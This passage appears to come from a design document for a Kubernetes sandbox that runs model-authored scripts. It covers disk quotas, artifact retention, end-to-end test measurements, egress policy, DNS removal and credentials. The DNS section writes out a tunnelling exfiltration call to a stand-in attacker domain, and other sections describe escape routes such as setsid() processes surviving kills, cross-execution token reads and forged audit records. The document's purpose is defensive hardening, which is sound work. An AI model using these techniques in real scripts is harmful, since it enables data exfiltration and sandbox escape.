<= SCRATCH_AGGREGATE_CEILING   480 MiB   = 512 MiB sizeLimit − 32 MiB for .supervisor and for
                                         filesystem overhead the per-tree walks do not see
```

`448 <= 480` is what makes the aggregate check a **backstop rather than a second quota**: the
two per-part budgets cannot together reach it, so it fires only on overshoot. **The kubelet
must never be the thing that fires:** exceeding an `emptyDir` `sizeLimit` does not fail the
write, it **evicts the pod**, killing the in-flight script and destroying every retained
artifact in the window.

**What this arithmetic does not prove.** The 32 MiB reserve is a margin, not a proof. A poll
can miss ~200 MiB of writes, and a child that traps `SIGTERM` keeps writing for
`KILL_GRACE_S` (2 s) after a quota fires; neither is bounded by 32 MiB and no arrangement of
these constants would bound them. What bounds them is how fast the writer is stopped (`SIGTERM`
immediately, `SIGKILL` 2 s later) and, afterwards, the trim. So the honest claim is: **the
steady state is exact and sits 64 MiB under the cliff; the transient peak during a hostile
burst is not**, and the aggregate check is what fires 32 MiB early instead of letting the
kubelet be the thing that notices.

- **Accounting is on `st_blocks` plus a per-entry floor, not `st_size`,** and both halves are
  needed. `st_blocks` because `f.seek(512 << 20); f.write(b'x')` makes a file whose apparent
  size is 512 MiB and whose blocks are nearly none — charging apparent size would kill that
  script for using no space. The 512-byte per-entry floor because charging blocks *alone* said
  a zero-length file was free: **measured**, 300 000 empty files charged 8.6 MB against the
  192 MiB quota, so no limit fired, while the response reached 19.8 MB and the supervisor's RSS
  went 22 MB → 166 MB. An empty file costs an inode, a directory entry, a manifest row and a
  scan step; it is not free anywhere that matters.
- **The entry budgets bound the watchdog's own scan, which is why the wall clock is a bound at
  all.** The scan stops at the budget — a tree with more entries than the budget allows is over
  it, and the exact count past that point changes no decision. Before that, one pass over
  800 000 empty files took 8.47 s and reported 0 bytes, and `artifacts/` was walked twice
  because it lives under the base directory: **measured**, with `timeout_s=30`, 0 files → killed
  at 30.23 s, 200 000 → 45.51 s, 800 000 → 46.74 s. `MAX_QUEUED_WAIT_S` is 120 s, so every
  second past the deadline is a second the next two callers spend queued or being `429`ed.
- **The poll interval is 200 ms and is chosen against the WALL CLOCK, not the overshoot.** The
  wall clock is the tightest of the four in the only sense that matters — it is the one bound a
  client is told the exact value of. The overshoot is the *loosest*: at ~1 GiB/s a poll misses
  ~200 MiB and no interval anybody would run makes that small. Three things keep the deadline
  honest: the poll wait shrinks as the deadline approaches, the scan is entry-bounded, and the
  clock is re-checked immediately *after* the scan so an overrun fires on that tick. The
  harness's quota tests still pace their writes — an unpaced writer hits `ENOSPC` (locally) or
  an eviction (in the pod) before the poll it is trying to demonstrate ever runs.
- **`artifacts/` is TRIMMED to its quota before it is retained,** newest entries first by
  mtime. Without this a quota kill retained its own overshoot: **measured**, a burst write
  killed by `ArtifactQuota` at 64 MiB left 93 MiB on disk (46 % over) in 0.31 s, and at the
  ~1 GiB/s tmpfs sustains that is ~264 MiB. Retaining it made the 256 MiB ceiling a ceiling
  over unbounded terms. The trim runs *before* the manifest is built — the other order would
  advertise names the trim then deletes — and what it deleted is reported in
  `artifacts_omitted`, the field that already means "present but not listed". Newest-first
  because the entry that blew the quota is the one being written when the kill landed.
- **Cleanup and post-hoc accounting are not bounded by the budgets they restore**, and bounding
  them there was circular. A *live* scan stops at the 20 000-entry budget because past that
  point the tree is over it either way. The trim stopping there meant it sorted a truncated
  sample and derived both the surviving entry count and the size it caches from it: **measured**,
  25 000 zero-length files left **6 024 entries against the 1 024 budget** and reported
  **0.5 MiB where the tree really held 2.9 MiB** — a 6× undercount that scales linearly, and
  the number the aggregate check and the ceiling eviction then treat as fact. It is reachable
  inside `KILL_GRACE_S` alone: ~14 000 empty-file creations/s were measured on a slow local
  filesystem, and the pod's `emptyDir` is faster. The trim now drains in bounded passes —
  chunk-at-a-time, a four-million-entry hard stop, and a pass that deletes nothing gives up
  rather than looping — so the size it returns is the size that is really there. The same
  correction applies to the **failure-path retention**, which measured only `artifacts/` on the
  one path where nothing has cleaned `tmp/`, `home/` or the caches yet, charging up to a whole
  192 MiB execution as zero; it measures the whole execution directory and re-checks the
  ceiling on the spot, since nothing else re-checks it until a next completion that may never
  come.
- **Retained sizes are measured once and cached.** Re-walking every retained tree on every
  completion made one 300 000-file execution a tax on all fifteen minutes of executions after
  it. Nothing the supervisor can reach writes to a retained directory — the child is reaped and
  the trim has already run — so the value cannot drift *for any process the kill path reaches*.
  It **can** drift for a `setsid()` escapee, which is not in the killed process group, keeps its
  write access to `/scratch/<id>/artifacts`, and can grow a tree after its size was cached: the
  retained total, the ceiling eviction and the in-run aggregate check then all read low. That is
  the same escapee section 2 records everywhere else and `4h6.55` owns; re-measuring would not
  fix it, since the writes continue after any measurement. An earlier wording of this bullet
  stated the no-drift claim unconditionally.
- **The cached sizes can also double-count, in the safe direction.** Sizing follows the path it
  is handed, so a child that replaces its own `artifacts/` with a symlink to another execution's
  directory gets those bytes charged to both rows: the total reads **high**, so the ceiling
  evicts earlier than it needs to, and nothing is under-protected. Deletion is unaffected —
  `shutil.rmtree` does not traverse a symlink and the trim unlinks one rather than descending
  it. Recorded, not fixed: a child that can plant it is already past the boundary `4h6.55` owns.
  The guard, if that boundary ever makes it worth having, is one `lstat` before measuring.
- **Oldest-first eviction has no "never evict the last one" guard**, and removing it was the
  fix: with it, a single over-ceiling execution sat above the ceiling permanently, because
  there was nothing older to evict. The trim is what protects the newest execution now, and
  protects it properly — every retained entry is ≤ 64 MiB against a 256 MiB ceiling.
- **On completion everything under `/scratch/<id>` is deleted except `artifacts/`**, which is
  retained 15 minutes so `read_artifact` has something to return and is then deleted
  unconditionally, read or not.
- **Eviction is observable on the wire without any host view of `/scratch`:** an evicted
  execution's id stops answering `409 DuplicateExecutionId` and becomes usable again, because
  its directory is gone. That is what the harness asserts, in both modes.
- **The reaper has two mechanisms because they answer different failures.** The registry
  covers executions that *completed*. A filesystem sweep covers a directory whose job died on
  a path that never reached `_retain` — an orphan the registry has no row for, which would
  otherwise sit until the pod restarts; live and queued ids are excluded by name first.
- **Retention does not survive a pod restart**, and the startup wipe (`4h6.39`) removes
  everything unrecognised, which after a restart is everything.

**`SANDBOX_RETENTION_S` is a test-only override with the same standing as
`SANDBOX_SCRATCH_ROOT`:** loud warning on every start, never set by the image and never by
`k8s/deployments/sandbox.yaml`. It may only **shorten** retention — a larger value is
**refused at startup, not clamped**, because artifacts outliving what `read_artifact` was told
is worse than a startup error, and a knob that is silently ignored is a knob that gets
believed. It exists so the reaper can be watched deleting a directory inside a test run rather
than fifteen minutes later; `scripts/test-supervisor.py --container URL --retention-s N`
asserts the caller started the container that way, and **skips the retention check by name**
when it is absent rather than quietly proving less. Measured this way in the real image: the
supervisor logged `retention reaper removed 1 execution directory` and the id became reusable.

#### `error.type` is validated on arrival, not echoed

The child is forked without `exec`, so the script holds the status fd and writes the string
that becomes `error.type`. `message` had a 2 KiB cap and `traceback` an 8 KiB tail cap from the
start; `type` had **neither a cap nor a validator**, only the 64 KiB status-pipe read.
**Measured against the container:** a 60 000-character `error.type` reached the response,
bypassing the 64 KiB output window entirely and landing in a model's context, and a child
writing `{"type": "Timeout"}` produced `error.type: "Timeout"` with `error.limit: null` — a
shape only the supervisor is supposed to be able to emit, and one the contract invites clients
to branch on.

This is **the same defect `4h6.47` fixed on the other side of this wire**, where chat-backend's
client applied `_redact` to `message` and not to `error_type`. Both ends had the same blind
spot about the same field.

The supervisor now requires a child-supplied `type` to be ≤ 64 bytes and to match an
identifier or dotted qualname, and refuses its own reserved names; anything else is reported
as `NonZeroExit`. `StartupFailure` is the one reserved name a child legitimately writes — from
the child's own setup handler, which exits `70` and cannot reach the script — so it is admitted
on that exit code and refused on every other. None of this narrows what the *contract* says
`type` may hold: the reserved names are still reserved, a real exception class name still
passes through unchanged, and the field is still an open string to a client.

**The response as a whole is now bounded** at 1 MiB, the mirror of `MAX_BODY_BYTES` on the
request. Every component is separately capped (64 KiB output, 1024 manifest entries, 64 B
`type`, 2 KiB `message`, 8 KiB `traceback`), so a well-formed response is ~100 KiB and this
backstop should never fire; it exists because nothing bounded the outgoing body at all, and a
19.8 MB one was measured. Degradation drops `artifacts` first — counting them in
`artifacts_omitted`, since a name the model cannot see is recoverable and output it never sees
is not.

#### Still not provable locally

`oom_score_adj` writability and `/proc` process-group inspection under **gVisor** are
unverified — `runsc` implements both in the sentry — and so is the kubelet's `pod_pids_limit`
as an outer backstop (`--pids-limit` is per container, not per pod). `emptyDir` `sizeLimit`
eviction has **no local form at all**: the local `/scratch` is a 512 MiB tmpfs that returns
`ENOSPC`, which is a *different failure* from a pod eviction and a gentler one. These go to
`4h6.51`, the deploy-window bead.

### As built (`4h6.49`) — the end-to-end local verification: what was measured, and how

`scripts/test-e2e-local.py` drives the whole path against the running local stack —
chat-backend's **own** minting and client code (`genetics_mcp_server.sandbox_token`,
`sandbox_client`), the sandbox container `scripts/run-sandbox-local.sh` starts, and the real
db-api (`:8080`) and results-api (`:2000`) that `scripts/dev-stack.sh` starts. It is a separate
file from `scripts/test-supervisor.py` on purpose: that harness needs no cluster, no
credentials, no backends and (in its fast path) no Docker, and folding these preconditions into
it would take that property away from everyone who re-runs it.

**Measured 2026-08-17 against `genetics_dev`, with a sandbox container started as
`SANDBOX_RETENTION_S=45 scripts/run-sandbox-local.sh`:**

```
scripts/test-e2e-local.py --retention-s 45   → OK: 49 checks passed, nothing skipped.
scripts/test-e2e-local.py                    → OK: 48 checks passed, nothing skipped.
```

**Each count is quoted next to the command that produces it, because a count without its
command is not a claim.** The two differ by one check and not by four: the harness *discovers*
the container's effective retention, so the group runs either way and `--retention-s` only adds
the cross-check that the caller's number matches. Against a container with **no**
`SANDBOX_RETENTION_S` — the normal state — the retention group **skips**, the run prints
`NOT MEASURED (1)` and a `PARTIAL:` banner instead of `OK:`, and it still **exits 0**. A green
exit is not by itself a claim that everything was measured. The `INTERNAL_API_SECRET` negative
control skips the same way if that secret is absent or does not authenticate locally. Every
skip is listed by name under `NOT MEASURED` and counted again in the exit banner for exactly
this reason.

**The run refuses to start against a container that is not the source under test.** It reads
`/genetics/supervisor.py` and `/genetics/prewarm.py` back out of the running container with
`docker cp` and compares them byte for byte with `sandbox/`, exiting 2 if they differ:
`genetics-sandbox-local` survives rebuilds and branch switches, `run-sandbox-local.sh` is
itself modified by this change, and every check below would otherwise be a true statement about
a program nobody is verifying. What that does **not** cover, and is not claimed:
`sandbox/requirements.txt`, `prune_venv.py` and the genetics-mcp-server checkout the SDK is
installed from all shape the image without appearing under `/genetics`.

What each check group is worth:

* **The SDK's request is in results-api's `sandbox_budget` map, keyed on the token's `jti`.**
  A 200 is not the evidence — `app/middleware_usage_logging.py` stamps `jti` and `sid` on the
  `endpoint_access` record only from a resolved `SandboxPrincipal`, and
  `SandboxResponseCapMiddleware` calls `admit` for exactly that principal. The **negative
  control is measured in the same run whenever the secret is available and authenticates** (it
  was, in the run above): the identical request carrying `INTERNAL_API_SECRET` is served **200
  with no `jti` at all**, which is the shape of `0lf`. Where it is not available the control
  **skips by name** rather than being argued. Accumulation, not just
  admission, is shown by driving `SANDBOX_MAX_CONCURRENT_REQUESTS` (4) from inside a real
  execution with twelve concurrent SDK calls and reading the `sandbox per-execution limit
  exceeded` records back out of results-api's log under that same `jti`.
* **The audit records carry the real identity.** A real execution's SDK calls appear in
  `docker logs` (the container's **stdout**, not its stderr) in the shipped analyzer's own
  regex shape, with `user`/`session`/`execution` equal to the token's `sub`/`sid`/`jti` — never
  `unknown` — and with the function names of the calls actually made. In the same run a script
  writes a forged `[user=admin@finngen.fi] … Executing SDK function: …` record and a 1 MiB line
  onto the audit fd: no record parses as `admin@finngen.fi`, everything that survives is
  re-stamped with the real identity, and the megabyte line is **dropped, not truncated and
  forwarded** — the supervisor's `a record over 4096 bytes was DROPPED (not truncated)` notice
  appears under the real `execution` and its per-execution summary counts the record as
  `dropped_oversize`, which is what a truncate-and-forward regression would fail. The forged
  script makes a genuine SDK call first, so the two "nothing forged survives" assertions are
  `all()`/`not any()` over a window that demonstrably contains a real record.
* **One value, and the join closes.** `execution_id`, `/scratch/<id>`, both tokens' `jti` and
  the child's `SANDBOX_EXECUTION_ID` are the same string, and that string appears in
  chat-backend's result, db-api's `sandbox request authorized` record (with the same `sub` and
  `sid`), results-api's `endpoint_access` record and the audit stream.
* **Every limit the bead names returns a clean structured result to chat-backend's own
  client** — not an exception, not a hang: the wall clock (`timeout`/`Timeout`), the 8 MiB pipe
  cap (`limit`/`OutputLimit`), the per-execution artifact quota (`limit`/`ArtifactQuota`), and
  the 64 KiB return window (`ok`, head and tail both present, elision visible and counted, with
  `output_bytes` reporting the true pre-cap total). `test-supervisor.py`'s `limits` group
  already watches each one fire on the wire; what is new here is that `SandboxClient.execute`
  turns each into a result dict.
* **The signing key is fail-closed.** With `SANDBOX_TOKEN_SIGNING_KEY` unset the execution
  fails by name and a counting transport shows **zero** requests left the client — no fallback
  to the shared secret and no uncredentialed request. With a *wrong* key the execution runs and
  both backends answer **401**, and neither records a principal for that `jti`.
* **Retention, and precisely what the two probes pin.** An artifact is still there **at half
  the container's own TTL** (the id is still taken, `409 DuplicateExecutionId`) and gone after
  `TTL + REAPER_POLL_S`, because `SANDBOX_RETENTION_S` shortens the deadline and **not** the
  reaper's 30s poll. The TTL is not taken from the caller: the harness reads the container's
  **effective** `SANDBOX_RETENTION_S` from `docker inspect` and from the supervisor's own
  startup warning, requires the two to agree, and skips by name if they do not — `--retention-s
  N` only *cross-checks* that value, and a mismatch is a failure rather than two probes about
  the wrong number. This is why the presence probe waits: a `409` taken the instant the
  execution returns is satisfied by any positive retention, one second included, so it would
  pin nothing at all. What is established is **"still present at TTL/2, absent by TTL +
  REAPER_POLL_S"**, not "present until the deadline" — the interval between the last probe and
  the deadline is unmeasured, and it belongs to the reaper. The presence side is also sound
  only while nothing else is retaining concurrently, which is why the harness refuses to start
  against a busy sandbox. The **mechanism** is what is verified, at a shortened TTL; the
  shipped 900s constant is read off `sandbox/supervisor.py`, not waited out.
* **The process-group kill, on the path where the kill actually happens.** `_kill_group` has
  exactly one call site in `sandbox/supervisor.py` and it is inside `_fire_limit`, so **the
  group is signalled only when a limit fires**. The assertion therefore goes on an execution
  that spawns two grandchildren and then holds the wall clock open until it is killed: the
  grandchild that stayed **in** the group does not outlive that kill. The
  normally-completing path is *recorded* rather than asserted, because the group is never
  signalled there at all and asserting otherwise would be asserting a wish.

**Three defects in the local setup were found by trying to run this and are fixed in the same
change.** Each one made the local run *look* fine while proving less:

1. `scripts/run-sandbox-local.sh` pointed `GENETICS_API_URL` at `host.docker.internal:4000` —
   the cluster's results-api Service port. Locally `:4000` is **chat-api**, which answers 404
   on `/api`; results-api is on `:2000`. The SDK was talking to chat-backend.
2. `scripts/dev-stack.sh` provisioned no `SANDBOX_TOKEN_SIGNING_KEY`, no `INTERNAL_API_SECRET`
   and no `SANDBOX_ENABLED`, so db-api and results-api resolved **no sandbox principal at all**
   and served the SDK with no per-execution accounting — locally indistinguishable from the bug
   the tokens exist to fix. It now generates both secrets once into `DEV_STACK_RUN_DIR` (stable
   across restarts, outside every repo) and exports them with `SANDBOX_ENABLED=true`.
3. `SANDBOX_RETENTION_S` had no way through `run-sandbox-local.sh`, so the retention deadline
   was unobservable in container mode. It is now passed through.

**Two findings on results-api, filed rather than worked around:**

* Its JSON log formatter carries `sid` and `jti` out of `log_rejection`'s `extra` and **drops
  `code`, `limit` and `observed`** — so `Rejection.code`, whose whole purpose is to make a 429
  actionable in a log, never reaches an operator. The code *is* on the wire in the 429 body,
  and the harness reads it there.
* `endpoint_access` records `user_email: null` for a sandbox principal even though `sid` and
  `jti` are stamped, so the authenticated user is not attributable from results-api's log
  alone. db-api's record and the audit stream both carry `sub`.

**Deliberately measured rather than asserted: `4h6.55`'s `setsid()` finding REPRODUCES here.**
In this configuration — plain Docker, `runc`, `--pids-limit 1024` — a grandchild that
`setsid()`s away from the execution's process group is **still resident after the execution has
been killed by its wall clock**, while its sibling that stayed in the group is gone. Measured
2026-08-17:

```
process group: a grandchild IN the group does not outlive a limit kill        ok
note  after the LIMIT kill the setsid() grandchild is RESIDENT: alive=['D'] zombie=['G']
note  the NORMALLY-COMPLETING execution's group is never signalled, and both of its
      grandchildren are alive=['D', 'G']
```

Neither note is a pass/fail: asserting the escapee is gone would assert the comfortable answer,
and asserting it survives would fail this harness on a property nobody has claimed. **A green
run of this file is not evidence that `4h6.55` fails to reproduce under `runc`. It reproduces.**
`4h6.55` is P0 and open, and this changes nothing about it.

An earlier draft of this section claimed the opposite, and the mechanism by which it did is
worth keeping written down. The probe `exec`'d `/bin/sleep`; the image is
`gcr.io/distroless/python3-debian12:nonroot` and **has no `/bin/sleep`** — no coreutils and no
shell at all — so both forks died in `execv` with `ENOENT` and lingered only as unreaped
zombies carrying no marker. The scan then found nothing, and "nothing found" read as "nothing
survived". The guard written specifically to stop that — *the grandchildren really were
spawned* — counted the parent's `SPAWNED` lines, which the parent prints on the `pid != 0`
branch the moment `fork()` returns, **before and regardless of** whether the child's `exec`
succeeded. A guard on a syscall's return value is not a guard on the object's existence. The
probe now forks without `exec`ing (the shape `scripts/test-supervisor.py` already uses), names
each grandchild through `/proc/self/comm` (`prctl(PR_SET_NAME)` — a fork without `exec`
inherits the parent's `argv`, so the name is the only marker available), and the parent **reads
that name back out of `/proc/<pid>/comm`** before it goes on. The scan looks for it in
`/proc/<pid>/stat`, and treats an unreaped zombie as *not* a survivor: the supervisor is pid 1
and never waits on orphans, so a grandchild it killed stays visible with its name intact and
state `Z`.

**Nothing here establishes any cross-user isolation property**, and the harness says so: `4h6.55`
has measured a child reading other executions' tokens out of inherited memory and reading and
overwriting other executions' artifacts. `4h6.55` states the local single-developer path is not
blocked by that; it does not become untrue because this run passed.

**Not claimed, and not claimable here:** gVisor syscall behaviour, the NetworkPolicy egress
allow-list, the kubelet's `pod_pids_limit`, RuntimeDefault seccomp, and whether `oom_score_adj`
and `/proc` process-group inspection behave under `runsc`. Those are `4h6.51`'s.

---

## 3. Egress policy

Today `k8s/network-policies/policies.yaml` contains **ingress rules only** — there is no
egress policy anywhere in the namespace. The sandbox introduces the first one, and it is
default-deny.

### Decisions

`k8s/network-policies/sandbox-policy.yaml`, selector `app: sandbox`.

**As built (`4h6.8`).** Two objects rather than one, following the namespace's
`allow-ingress-<target>` naming: `allow-ingress-sandbox` (`policyTypes: ["Ingress"]`) and
`sandbox-egress` (`policyTypes: ["Egress"]`). They union to the single
`["Ingress", "Egress"]` object specified above; splitting them keeps the file's names
consistent with the eight existing ingress policies. The file is applied by
`deploy.sh`'s existing `kubectl apply -f network-policies/`, which takes the whole
directory — no `deploy.sh` change was needed.

**Label contract, declared here and repeated at the top of the policy file and in the
`4h6.7` bead notes:** pod label `app: sandbox` on the Deployment's
`.spec.template.metadata.labels`, container port **8080/TCP**, Service named `sandbox`
(ClusterIP 8080 → targetPort 8080). NetworkPolicy `ports` are **pod** ports, not Service
ports. A podSelector that matches no pod is not an error — it is silent no-coverage, and
since this is the only egress policy in the namespace, a label mismatch in `4h6.7` yields a
sandbox with *unrestricted* egress and no signal anywhere.

**Egress — allow exactly two, deny everything else:**

| Destination | Port | Why |
|---|---|---|
| `podSelector: app: db-api` | 8080/TCP | The primary data path. |
| `podSelector: app: results-api` | 4000/TCP | Summary statistics, LD, fuzzy search — the things BigQuery cannot serve. |

Read that table as a statement about *data*, not about endpoints: a third-party annotation
source is unreachable by construction because no rule can match it, whereas **anything
results-api serves is reachable** — including artefacts it merely relays from GCS, such as the
phenotype-report markdown — since the sandbox's token is not scoped per route (see "Require the
*sandbox* token on all routes", rejected below), so a script can reach any of it by hand-rolled
HTTP whether or not a wrapper exists for it.

**No kube-dns rule.** Name resolution is done with `hostAliases` instead — see "On DNS"
below. This is a change from an earlier draft, which allowed 53/UDP+TCP to
`kube-system`/`k8s-app: kube-dns` and booked DNS tunnelling as an accepted residual.

**Denied by omission, and each is load-bearing:**

- **The internet.** No `ipBlock` rule of any kind. A script cannot `pip install`, cannot
  fetch a mining payload, and cannot `POST` query results anywhere.
- **`chat-data`.** Not a network control — the PVC is simply not mounted (section 2). Named
  here because it is the asset the egress policy exists to protect.
- **keycloak and keycloak-postgres.** The identity broker and its database.
- **rag-service** and **chat-backend**. The sandbox is a leaf: it is called, it does not
  call back. Denying egress to chat-backend also means a script cannot re-enter the chat
  API with the caller's session.
- **mcp-server.** Denying this closes the obvious laundering route — a script that could
  reach mcp-server would inherit mcp-server's own permission through the
  `allow-ingress-db-api` policy and its whole registered tool surface (deliberately not
  counted here — re-derive from `TOOL_DEFINITIONS` + `BIGQUERY_TOOL_DEFINITIONS` +
  `SUBAGENT_TOOL_DEFINITIONS` minus `mcp_server.py`'s `_mcp_disabled`; a number written down
  here rots silently).
- **`169.254.169.254`** (the GCE/GKE metadata server). **Amended by `4h6.8` — the original
  "covered by default-deny" is an over-claim and the policy must not be relied on here.**
  No rule permits it, so under standard NetworkPolicy semantics it is denied; but
  link-local / node-local traffic is exactly the class already proven **exempt** from
  NetworkPolicy on this dataplane in the ingress direction (kubelet probes from
  `169.254.4.6` reach pods whose policies list only podSelectors — this is the same
  observation that lets every other rule in the namespace skip a probe ipBlock). Whether
  Dataplane V2 enforces *egress* to a link-local address has not been tested on this
  cluster. Assume no coverage from the policy until it is; `genetics-results-suite-4h6.26`
  carries the test. What is actually load-bearing: the node pool runs in
  `GKE_METADATA` mode and the sandbox KSA has no
  Workload Identity binding, so even a policy-engine gap yields no usable GCP credential.
  Note precisely what does *not* help here — `automountServiceAccountToken: false` is a
  Kubernetes-API control and has no bearing on the metadata server, and Workload Identity
  bindings are irrelevant if the pool were ever created in `GCE_METADATA` mode. The
  metadata defence lives in the node pool spec (section 2), not in this policy.

**Ingress — allow exactly one:**

| Source | Port |
|---|---|
| `podSelector: app: chat-backend` | 8080/TCP |

Not the load balancer, not mcp-server, not the monitor. `k8s/network-policies/monitor-policy.yaml`
must **not** be extended to include the sandbox; liveness is the kubelet's job and kubelet
probes are not subject to NetworkPolicy.

### The other half of the egress path: db-api's ingress policy must be amended

**Without this edit the primary data path does not work at all.** A NetworkPolicy egress
allow on the sandbox side is necessary but not sufficient:
`k8s/network-policies/policies.yaml` declares a namespace-wide `default-deny-ingress`, and
`allow-ingress-db-api` currently admits only `app: chat-backend` and `app: mcp-server` on
8080. Every sandbox → db-api connection is therefore dropped at the *receiving* end no
matter what the sandbox's own policy says.

`4h6.8` adds

```yaml
- podSelector:
    matchLabels:
      app: sandbox
```

to the existing `from:` list of `allow-ingress-db-api`.

**Amended by `4h6.8`: the same edit is required on `allow-ingress-results-api`, and this
paragraph used to say the opposite.** The original text said "nothing else in that file
changes" and warned against copying `allow-ingress-results-api`, because at the time that
policy carried a rule with `- ports:` and **no `from:`** — which admits *all* sources, so
the sandbox would have reached results-api on 4000 without an explicit entry. That hole
was one half of `genetics-results-suite-fad` and it is now **closed**: `fad` and
`genetics-results-suite-k4t` between them scoped every from-less rule in the namespace, so
`allow-ingress-results-api` is now an explicit podSelector list (auth-gateway, bff,
chat-backend, mcp-server). The sandbox must therefore be added to it **explicitly**, or the
results-api half of the data path is dropped at the receiving end exactly like db-api's.
The original warning still stands in its general form: every rule added for the sandbox
carries an explicit `from:`, and `scripts/test-network-policies.py` asserts that none of
them is from-less.

**Both reverse-direction entries are reachability only; neither path returns data today.**
db-api 401s any request without `Authorization: Bearer $INTERNAL_API_SECRET`, and since
`fad` results-api returns 401 for a request carrying neither the trusted-proxy marker nor
a valid bearer (`REQUIRE_AUTH=true` in production; `get_verified_user` → `None` →
`auth_required` raises 401). The sandbox holds neither secret **by design**. So after
`4h6.8` the sandbox can open a TCP connection to both services and every request comes back
401 until `4h6.9` lands the scoped short-lived credential. That is the expected
intermediate state, not a regression — and the fix is `4h6.9`, never handing the sandbox
`INTERNAL_API_SECRET`.

### On DNS

**Decision: no DNS egress in v1. The sandbox resolves names from `hostAliases`.**

An earlier draft allowed kube-dns and booked DNS tunnelling as a low-bandwidth accepted
residual — "a few hundred bytes per query". That framing is wrong by three orders of
magnitude and it falsifies two claims this document makes elsewhere. A pod with egress to
CoreDNS can sustain on the order of 10³ queries/second; at roughly 200 usable base32 bytes
per query name that is **~200 KB/s, i.e. tens of megabytes inside the 120-second wall
clock**. That is not a side channel, it is a working egress pipe. It needs no POST and no
response — `socket.getaddrinfo(b32(chunk) + '.exfil.attacker.example')` is the whole
payload, and the resolver walks it upstream to the attacker's authoritative server for
free. It is also exactly how a stolen credential leaves the cluster: a GCP access token is
about 1 KB, five queries.

So the elimination becomes the default:

- No kube-dns rule in the sandbox egress policy.
- `hostAliases` on the sandbox pod pinning `db-api` and `results-api` to their ClusterIPs,
  which `deploy.sh` resolves and substitutes at deploy time. The sandbox resolves **exactly
  two names** — this is the whole reason the trade is cheap here and would not be cheap for
  any other pod in the namespace.
- ClusterIPs are stable for a Service's lifetime, so the pinning holds. The cost is a
  deploy-time coupling between the manifest and live cluster state: if a Service is deleted
  and recreated, the sandbox must be re-rendered and rolled. `deploy.sh` already generates
  manifests, so this is a known shape rather than a new one, and the failure mode is a
  connection error the model sees, not a silent wrong answer.

Eliminating DNS moves name resolution from a network service into libc configuration, and
libc configuration has four sharp edges. Each is a hard requirement on `4h6.7` and
`4h6.8`, not advice.

**(a) Pin all four name forms, and fix the URL form the SDK is given.** `hostAliases`
writes literal strings into `/etc/hosts`, and the glibc `files` NSS module does **no
search-domain expansion** — `db-api` in `/etc/hosts` does not answer a lookup for
`db-api.genetics.svc.cluster.local`. Every service URL in this suite is an FQDN:
`k8s/deployments/chat-backend.yaml` and `k8s/deployments/mcp-server.yaml` both use
`http://db-api.genetics.svc.cluster.local:8080`. So pinning the bare name alone breaks the
moment the sandbox is configured like every other service in the namespace. Each of the two
IPs gets **all four forms** as multiple `hostnames` under one entry:

```yaml
hostAliases:
  - ip: "${DB_API_CLUSTER_IP}"
    hostnames: ["db-api", "db-api.genetics", "db-api.genetics.svc", "db-api.genetics.svc.cluster.local"]
  - ip: "${RESULTS_API_CLUSTER_IP}"
    hostnames: ["results-api", "results-api.genetics", "results-api.genetics.svc", "results-api.genetics.svc.cluster.local"]
```

and the SDK is configured with the **FQDN** form —
`http://db-api.genetics.svc.cluster.local:8080` and
`http://results-api.genetics.svc.cluster.local:4000` — matching the rest of the suite. The
other three forms are pinned so that a URL copied from anywhere else still resolves rather
than falling through to a DNS lookup that cannot happen.

**(b) `/etc/nsswitch.conf` must be asserted at image build time. The whole decision rests
on it.** `hostAliases` only helps if glibc consults `files` before `dns`. When
`/etc/nsswitch.conf` is **absent**, glibc's compiled-in default for the hosts database is
`dns [!UNAVAIL=return] files` — **DNS first**. Combined with an egress policy that
**drops** 53/UDP rather than rejecting it, every lookup then stalls through the full
resolver timeout budget (roughly 5s × 2 attempts × 2 nameservers) before falling back to
`/etc/hosts`. Inside a 60-second wall clock that is crippling, and it is a **hang, not an
error** — precisely the failure shape this decision claims to have eliminated. It cannot be
repaired at runtime either: `readOnlyRootFilesystem: true`. Distroless images do ship an
`/etc/nsswitch.conf` containing `hosts: files dns`, but "do" is not a guarantee across base
image revisions. **`4h6.6` must assert at build time** that `/etc/nsswitch.conf` exists in
the final image and that its `hosts:` line lists `files` before `dns` — a build-stage check
that fails the build, plus a startup assertion in the supervisor as a cheap backstop.

**(c) Implicit resolutions must be eliminated, not merely denied.** Anything that reaches
`google.auth.default()` probes `metadata.google.internal` **by name**. With no DNS that is
the same multi-second stall as (b), not the fast failure the design assumes. `4h6.6`
therefore requires **either** that the sandbox image contains no `google-auth`-based client
at all (preferred — the SDK talks to db-api and results-api over plain HTTP and needs no
GCP client), **or**, if one is unavoidable as a transitive dependency, that
`GCE_METADATA_HOST` is set to a literal IP so the probe fails immediately against the
NetworkPolicy instead of stalling in the resolver. Two things this does *not* affect: TLS
(both destinations are plain HTTP, so there is no certificate hostname to reconcile with an
IP), and IPv6 (`/etc/hosts` entries yield A records only, and neither Service is
dual-stack).

**(d) `deploy.sh` must resolve the ClusterIPs after the Services exist, and validate the
result.** Three specific traps, all silent:

- **Bootstrap deadlock.** `deploy.sh` is `set -euo pipefail`. The natural place to put the
  `kubectl get svc` lookups is the "derive variables" block near the top — and there they
  abort the **first deploy to a fresh cluster**, before any manifest is applied, because the
  Services do not exist yet. The lookups must run **after** the Services are applied. The
  apply loop iterates `deployments/*.yaml` alphabetically with each Service defined inside
  its own deployment file, so resolving per-file inside that loop works: by the time
  `sandbox.yaml` is reached, `db-api.yaml` and `results-api.yaml` have been applied.
- **Silent literal passthrough.** The existing `envsubst` calls pass **explicit variable
  allow-lists**. A name omitted from that list is not substituted and not an error — the
  manifest ships with the literal string `${DB_API_CLUSTER_IP}` in the `ip:` field.
  `DB_API_CLUSTER_IP` and `RESULTS_API_CLUSTER_IP` must be added to the deployments
  `envsubst` allow-list.
- **Headless `None`.** `kubectl get svc ... -o jsonpath='{.spec.clusterIP}'` returns the
  literal string `None` for a headless Service, and `None` substitutes into the manifest
  perfectly cleanly. The resolved value must be **validated as a dotted quad** and the
  deploy aborted otherwise — not defaulted, not warned about.

**If this is ever reverted** — for instance because an SDK dependency turns out to need a
third name — the residual must be restated honestly at ~200 KB/s rather than "a few hundred
bytes", and section 6.2 control #1 and section 6.4 control #2 must both be rewritten,
because with DNS allowed there *is* a sink and the classic payload *does* have somewhere to
go. Reverting is a decision about accepting bulk exfiltration, not a convenience tweak.

---

## 4. Credentials

### The rule

**The sandbox never holds `INTERNAL_API_SECRET`.** That secret authenticates the *service*,
not the *request*; it does not expire; and a script that reads it can reach db-api and
results-api directly and forever, from anywhere those services are reachable. The
`_ALLOWED_ENV_KEYS` comment records that this exact secret already leaked into
model-authored scripts once.

Note also *why a network policy is not a sufficient substitute*. `docs/project-spec.md`
